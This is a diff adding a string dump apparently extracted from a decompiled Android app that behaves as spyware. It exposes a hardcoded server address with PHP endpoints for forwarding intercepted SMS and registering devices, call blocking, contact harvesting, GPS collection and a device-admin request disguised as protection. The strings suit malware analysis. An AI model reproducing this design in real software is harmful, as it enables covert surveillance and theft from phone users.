@@ -1,0 +1,201 @@
+arglength:1
+arg:./tmp/smali
+MIME type may not be null
+application/octet-stream
+byte[] may not be null
+binary
+application/octet-stream
+File may not be null
+binary
+Output stream may not be null
+application/octet-stream
+Input stream may not be null
+binary
+Output stream may not be null
+text/plain
+Text may not be null
+US-ASCII
+text/plain
+Charset 
+ is not supported
+8bit
+Output stream may not be null
+Name may not be null
+Body may not be null
+Field name may not be null
+form-data; name=\"
+\"
+; filename=\"
+\"
+Content-Disposition
+; charset=
+Content-Type
+Content-Transfer-Encoding
+: 
+\r\n
+--
+Multipart subtype may not be null
+Multipart boundary may not be null
+Content-Disposition
+Content-Type
+STRICT
+BROWSER_COMPATIBLE
+US-ASCII
+: 
+-_1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
+form-data
+Content-Type
+Streaming entity does not implement #consumeContent()
+multipart/form-data; boundary=
+; charset=
+Multipart form entity does not implement #getContent()
+http://114.45.72.213/
+connectivity
+address
+UTF-8
+Error Response: 
+0
+application/3gp*
+f1
+phone
+1
+latitude
+longitude
+accuracy
+UTF-8
+Error Response: 
+Error Response: 
+GET
+CallStateListner
+IDLE
+CallStateListner
+OFFHOOK
+pref
+TEL_BlockState
+CallBlock
+CallStateListner
+RINGING >> Incoming number : 
+CallStateListner
+end call!!
+phone
+getITelephony
+CallStateListner
+CallStateReceiver >>>>>>> onReceive
+pref
+TEL_BlockState
+CallBlock
+audio
+CallBlock
+end call!!
+phone
+getITelephony
+/data/data/rewjkolg.sfjioewf.view/
+contacts.db
+Contacts
+insert into 
+ (cnt_id, cnt_name, cnt_phone, cnt_mail, cnt_block) values(
+, \'
+\', \'
+\', \'
+\', 0)
+CREATE TABLE IF NOT EXISTS 
+(
+cnt_id integer PRIMARY KEY,
+cnt_name text,
+cnt_phone text,
+cnt_mail text,
+cnt_block INTEGER);
+_id
+display_name
+has_phone_number
+display_name COLLATE LOCALIZED ASC LIMIT 
+ OFFSET 
+has_phone_number=?
+1
+_id
+display_name
+contact_id = ? 
+contact_id = ? 
+data1
+-
+
+ 
+
+data1
+select * from 
+ where cnt_phone=\'
+\'
+cnt_block
+select * from 
+ where cnt_id=
+update 
+ set cnt_block=\'
+\' where cnt_id=
+update 
+ set cnt_name=\'
+\', cnt_phone=\'
+\', cnt_mail=\'
+\' where cnt_id=
+update 
+ set cnt_name=\'
+\', cnt_phone=\'
+\', cnt_mail=\'
+\', cnt_block=\'
+\' where cnt_id=
+This is an optional message to warn the user about disabling.
+android.intent.action.MAIN
+android.intent.category.HOME
+android.intent.action.MAIN
+android.intent.category.HOME
+pref
+ID
+SMS_BlockState
+TEL_BlockState
+Server_URL
+hp_state.php?telnum=
+pref
+sms_blockstate
+1
+tel_blockcallstate
+1
+SMS_BlockState
+TEL_BlockState
+Preodic
+ : 
+device_policy
+android.app.action.ADD_DEVICE_ADMIN
+android.app.extra.DEVICE_ADMIN
+android.app.extra.ADD_EXPLANATION
+\uae30\uae30\ubcf4\ud638\uc640 \uc571\uc758 \uc815\uc0c1\ub3d9\uc791\uc744 \uc704\ud574 \ub2e4\uc74c\uc758 \uc124\uc815\uc744 \uc720\ud6a8\ud654\ud558\uc5ec \uc8fc\uc2ed\uc2dc\uc624.
+android.provider.Telephony.SMS_RECEIVED
+pdus
+
+
+pref
+SMS_BlockState
+xinxian!-
+http://
+/
+hp_getsmsblockstate.php?telnum=
+1
+UTF-8
+index.php?type=receivesms&telnum=
+&sender=
+&memo=
+Server Return
+location_providers_allowed
+com.android.settings
+com.android.settings.widget.SettingsAppWidgetProvider
+android.intent.category.ALTERNATIVE
+3
+gps
+
+
+index.php?type=join&telnum=
+&telcompany=
+
+gps
+phone
+
+-
+phone
